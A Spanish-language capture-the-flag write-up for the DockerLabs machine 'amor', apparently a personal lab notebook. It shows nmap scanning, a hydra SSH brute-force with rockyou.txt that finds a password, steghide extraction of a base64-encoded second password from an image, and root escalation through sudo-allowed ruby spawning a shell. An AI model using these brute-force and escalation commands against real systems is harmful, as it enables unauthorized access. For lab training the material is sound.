Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #hydra #brute-force #dockerlabs #esteganografia
 
![](../assets/Pasted image 20251105215000.png)

## Reconocimiento

Comenzamos con un escaneo con nmap para listar los puertos abiertos
```bash
nmap -p- -sS -Pn -n --min-rate 5000 -oN ports.txt 172.17.0.3
---------------------------------------------------------------
Nmap scan report for 172.17.0.3
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:D1:20:12:D4:7B (Unknown)
```

- Puerto 80 HTTP y 22 SSH abiertos

Procedí con un segundo escaneo mas profundo para listar servicios y versiones
```bash
nmap -p 22,80 -Pn -n -sCV --min-rate 5000 -oN target.txt 172.17.0.3
--------------------------------------------------------------------
Nmap scan report for 172.17.0.3
Host is up (0.000055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: SecurSEC S.L
MAC Address: 02:D1:20:12:D4:7B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Puerto 80 Apache**
Al parecer es una simple pagina web lo único que me llamo la atención fue el apartado de despidos
- Veo el nombre de _carlota_ y _juan_ - Los cuales voy a utilizar para un ataque de fuerza bruta 
![](../assets/Pasted image 20251105215238.png)

## Explotación

Realice un ataque de fuerza bruta usando hydra
- _babygirl_ fue la password encontrada
```bash
> hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
------------------------------------------------------------------------------
[22][ssh] host: 172.17.0.3   login: carlota   password: babygirl
```

Me conecto mediante SSH
```bash
> ssh carlota@172.17.0.2
```


## Escalada de Privilegios

Lo primero que veo es que existe una `imagen.jpg` en la ruta:
```
> /home/carlota/Desktop/fotos/vacaciones/imagen.jpg
```

Por lo cual decidí bajármela en mi maquina
```bash
> scp carlota@172.17.0.3:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/wndr/Machines/DockerLabs/amor
```

Decidí usar `stgehide` para ver posibles mensajes ocultos mediante esteganografía.
- Me extrajo un archivo llamado secret.txt que al parecer es un mensaje codificado en _base64_
```bash
> steghide --extract -sf imagen.jpg
> cat secret.txt
------------------------------------
ZXNsYWNhc2FkZXBpbnlwb24=
```

Procedí a decodificar el texto
```bash
> echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
----------------------------------------------------
eslacasadepinypon
```

Supuse que el texto era alguna contraseña o algo asi, asi que decidí apuntar al archivo _/etc/passwd_ para ver posibles usuarios disponibles.
```bash
> cat /etc/passwd
--------------------------------------
oscar:x:1002:1002::/home/oscar:/bin/sh
```

Migro al usuario oscar
```bash
> su oscar
```

Procedo a enumerar binarios con privilegios de SUDO:
```bash
> sudo -l
-----------------------------------------------------------
User oscar may run the following commands on a15681e926ec:
    (ALL) NOPASSWD: /usr/bin/ruby
$ sudo -u /usr/bin/ruby -r 'exec "/bin/bash"'
```

Descubrí el binario _ruby_ y decidí buscarlo en `gtfobins` para explotarlo

```bash
> sudo -u root /usr/bin/ruby -e 'exec "/bin/bash"'
---------------------------------------------------------
root@a15681e926ec:/home/carlota/Desktop/fotos/vacaciones >  whoami
root
```

***PWNED***